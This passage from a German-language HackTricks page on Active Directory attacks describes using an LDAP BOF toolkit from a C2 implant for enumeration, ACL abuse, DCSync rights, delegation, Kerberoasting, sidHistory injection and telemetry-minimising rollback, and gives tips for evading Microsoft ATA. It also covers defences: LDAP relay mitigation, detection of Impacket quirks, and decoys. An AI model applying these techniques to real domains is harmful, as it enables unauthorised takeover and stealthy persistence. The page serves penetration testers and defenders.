[**Weitere Informationen zu Domain-Trusts auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-basierter AD-Missbrauch durch On-Host-Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-ähnliche LDAP-Primitives erneut als x64 Beacon Object Files, die vollständig innerhalb eines On-Host-Implants (z. B. Adaptix C2) ausgeführt werden. Operators kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen anschließend `ldap <subcommand>` aus dem Beacon auf. Der gesamte Traffic läuft über den aktuellen Logon-Sicherheitskontext via LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischem Zertifikatsvertrauen, sodass weder Socks-Proxies noch Artefakte auf der Festplatte erforderlich sind.<sup>[[4]](#references)</sup>

### LDAP-Enumeration auf der Implant-Seite

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen kurze Namen bzw. OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` rufen beliebige Attribute (einschließlich Sicherheitsdeskriptoren) sowie die Forest-/Domain-Metadaten aus `rootDSE` ab.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` stellen Roasting-Kandidaten, Delegationseinstellungen und vorhandene Deskriptoren für [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direkt über LDAP bereit.
- `get-acl` und `get-writable --detailed` analysieren die DACL, um Trustees, Berechtigungen (GenericAll/WriteDACL/WriteOwner/Attributschreibzugriffe) und Vererbung aufzulisten, wodurch unmittelbare Ziele für die ACL-Berechtigungseskalation ermittelt werden können.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-Schreibprimitive für Eskalation und Persistenz

- Object-creation-BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Maschinenkonten dort vorzubereiten, wo OU-Rechte vorhanden sind. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` übernehmen Ziele direkt, sobald Write-Property-Rechte gefunden wurden.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` wandeln WriteDACL/WriteOwner auf beliebigen AD-Objekten in Passwortzurücksetzungen, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsrechte um, ohne PowerShell-/ADSI-Artefakte zu hinterlassen. Die Gegenstücke `remove-*` bereinigen eingeschleuste ACEs.

### Delegation, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoast-fähig; `add-asreproastable` (UAC-Umschaltung) markiert ihn für AS-REP roasting, ohne das Passwort anzufassen.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` vom Beacon aus um. Dadurch werden Angriffswege über constrained/unconstrained/RBCD ermöglicht und die Notwendigkeit für Remote-PowerShell oder RSAT entfällt.

### sidHistory-Injection, OU-Verschiebung und Gestaltung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht so eine unauffällige Vererbung von Zugriffen vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/die OU von Computern oder Benutzern, sodass ein Angreifer Assets in OUs verschieben kann, in denen bereits delegierte Rechte vorhanden sind, bevor er `set-password`, `add-groupmember` oder `add-spn` missbraucht.
- Eng begrenzte Löschbefehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` usw.) ermöglichen ein schnelles Rollback, nachdem der Operator Credentials oder Persistenz erbeutet hat, und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Abwehrmaßnahmen

[**Erfahren Sie hier mehr darüber, wie Sie Credentials schützen können.**](../stealing-credentials/credentials-protections.md)

### **Abwehrmaßnahmen zum Schutz von Credentials**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, Domain Admins nur die Anmeldung an Domain Controllern zu erlauben und ihre Verwendung auf anderen Hosts zu vermeiden.
- **Berechtigungen von Service Accounts**: Services sollten aus Sicherheitsgründen nicht mit Domain-Admin-(DA-)Berechtigungen ausgeführt werden.
- **Zeitliche Begrenzung von Berechtigungen**: Bei Aufgaben, die DA-Berechtigungen erfordern, sollte deren Dauer begrenzt werden. Dies kann erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Minderung von LDAP relay**: Event-IDs 2889/3074/3075 prüfen und anschließend LDAP signing sowie LDAPS channel binding auf DCs/Clients erzwingen, um LDAP-MITM-/relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokollbasierte Erkennung von Impacket-Aktivitäten

Wenn Sie gängige AD-Techniken erkennen möchten, **verlassen Sie sich nicht ausschließlich auf vom Operator kontrollierte Artefakte**, etwa umbenannte Binaries, Servicenamen, temporäre Batch-Dateien oder Ausgabepfade. Erstellen Sie eine Baseline dafür, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- und WMI-Datenverkehr erzeugen, und suchen Sie anschließend nach **Implementierungsbesonderheiten**, die auch dann bestehen bleiben, wenn der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` bearbeitet.<sup>[[8]](#references)</sup>

- **Kandidaten mit hoher Zuverlässigkeit als eigenständige Indikatoren** (nach Validierung anhand Ihrer eigenen Baseline):
- Authentifiziertes DCE/RPC mit `auth_context_id = 79231 + ctx_id`
- Mit `0xff` aufgefülltes DCE/RPC-Authentifizierungs-Padding
- LDAP-Kerberos-Binds, die ein rohes Kerberos-`AP-REQ` direkt in SPNEGO-`mechToken` platzieren
- SMB2/3-Negotiate-Anfragen mit wie ASCII aussehenden `ClientGuid`-Werten
- WMI-`IWbemLevel1Login::NTLMLogin` unter Verwendung des nicht standardmäßigen Namespace `//./root/cimv2`
- Hardcodierte Kerberos-Nonce-Werte
- **Besser als Korrelations-/Scoring-Merkmale geeignet**:
- Spärliche oder duplizierte Kerberos-Etype-Listen, ungewöhnliche/fehlende `PA-DATA` oder eine TGS-REQ-Etype-Reihenfolge, die von nativem Windows abweicht
- NTLM-Type-1-Nachrichten ohne Versionsinformationen oder Type-3-Nachrichten mit Null-Hostnamen
- Rohes NTLMSSP in DCE/RPC statt in SPNEGO, fehlende DCE/RPC-Verifizierungs-Trailer oder nicht übereinstimmende SPNEGO-/Kerberos-OIDs
- Mehrere dieser Merkmale vom selben Host/Benutzer/in derselben Session bzw. demselben Zeitfenster sind deutlich aussagekräftiger als jedes einzelne schwache Feld
- **Als Anreicherung verwenden, nicht als eigenständige Alerts**:
- Standarddateinamen, Ausgabepfade, zufällige Servicenamen, temporäre Batch-Namen, Standardnamen von Computerkonten sowie tool-spezifische HTTP-/WebDAV-/RDP-/MSSQL-Strings
- Diese lassen sich von Operatoren leicht ändern und sollten am besten dazu verwendet werden, zu erklären, warum ein protokollübergreifender Cluster verdächtig ist
- **Operative Hinweise**:
- Einige dieser Signale erfordern entschlüsselten Datenverkehr, [PCAP-/Zeek-Parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Sichtbarkeit auf der Serviceseite
- Vor der Umwandlung in Alerts sollte eine Validierung anhand von Samba-/Linux-Clients, Appliances und Legacy-Software erfolgen
- Erkennungen mit zunehmendem Vertrauen in die Baseline schrittweise von Anreicherung -> Hunting -> Alerting überführen

### **Implementierung von Deception-Techniken**

- Die Implementierung von Deception umfasst das Aufstellen von Fallen, etwa Decoy-Benutzern oder -Computern, mit Eigenschaften wie nicht ablaufenden Passwörtern oder der Markierung als Trusted for Delegation. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit bestimmten Rechten oder das Hinzufügen zu Gruppen mit hohen Berechtigungen.<sup>[[2]](#references)</sup>
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Weitere Informationen zum Einsatz von Deception-Techniken finden Sie unter [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Erkennung von Deception**

- **Für Benutzerobjekte**: Verdächtige Indikatoren umfassen atypische ObjectSIDs, seltene Anmeldungen, Erstellungsdaten und eine geringe Anzahl fehlgeschlagener Passworteingaben.
- **Allgemeine Indikatoren**: Der Vergleich der Attribute potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können bei der Erkennung solcher Täuschungen helfen.

### **Umgehung von Erkennungssystemen**

- **Umgehung der Microsoft-ATA-Erkennung**:
- **Benutzeraufzählung**: Sitzungsaufzählungen auf Domain Controllern vermeiden, um eine Erkennung durch ATA zu verhindern.
- **Ticket-Impersonation**: Die Verwendung von **aes**-Schlüsseln zur Ticketerstellung hilft bei der Umgehung der Erkennung, da kein Downgrade auf NTLM erfolgt.
- **DCSync-Angriffe**: Es wird empfohlen, diese von einem Nicht-Domain-Controller auszuführen, um die ATA-Erkennung zu vermeiden, da eine direkte Ausführung von einem Domain Controller Alerts auslöst.

## References

- [1] [Ein Leitfaden zum Angriff auf Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Trusts für Deception in Active Directory fälschen](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Vom Domain Admin zum Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP-BOF-Sammlung – In-Memory-LDAP-Toolkit zur Ausnutzung von Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM-Hashes als Wordlist weaponizen](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket analysieren](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon – Onelogon: Übernahme von Active-Directory-Konten über Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft – Verwalten der Änderungen an sicheren Netlogon-Kanalverbindungen im Zusammenhang mit CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Eine Reise in vergessene Null-Session- und MS-RPC-Schnittstellen](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 4) – Forschung zur Umgehung der SID-Filterung](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 5) – Golden-GMSA-Trust-Angriff – vom Child zur Parent-Domain](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 6) – Schema-Change-Trust-Angriff – vom Child zur Parent-Domain](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Von DA zu EA mit ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [In 5 Minuten von den Admins einer Child-Domain zu Enterprise Admins eskalieren durch den Missbrauch von AD CS – eine Fortsetzung](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ein ACE im Ärmel: Entwurf von Active-Directory-DACL-Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
